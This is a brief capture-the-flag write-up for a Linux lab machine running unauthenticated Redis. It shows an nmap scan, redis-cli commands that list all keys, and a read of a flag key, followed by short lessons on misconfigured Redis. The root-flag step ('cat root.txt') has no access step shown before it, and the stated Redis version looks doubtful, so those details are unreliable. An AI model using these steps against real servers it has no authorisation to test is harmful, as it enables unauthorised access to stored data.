@@ -1,0 +1,37 @@
+**Difficulty:** Very Easy
+**OS:** Linux
+**Date:** 2026-9-17
+
+---
+
+## 1. Reconnaissance
+
+Nmap scan:
+nmap -sV -sC -p- <IP>
+
+Open ports:
+
+6379 (Redis) — Redis 5.7.0
+
+2. Exploitation
+
+Connect to the Redis server:
+redis-cli -h <IP>
+
+List all keys:
+keys *
+
+Get the flag:
+get flag.txt
+
+3. Flags
+Root flag: cat root.txt
+
+4. Lessons Learned
+Redis without authentication allows full access to the database.
+
+keys * reveals all stored keys.
+
+get <key> retrieves the value.
+
+Redis is often misconfigured and exposed to the internet.
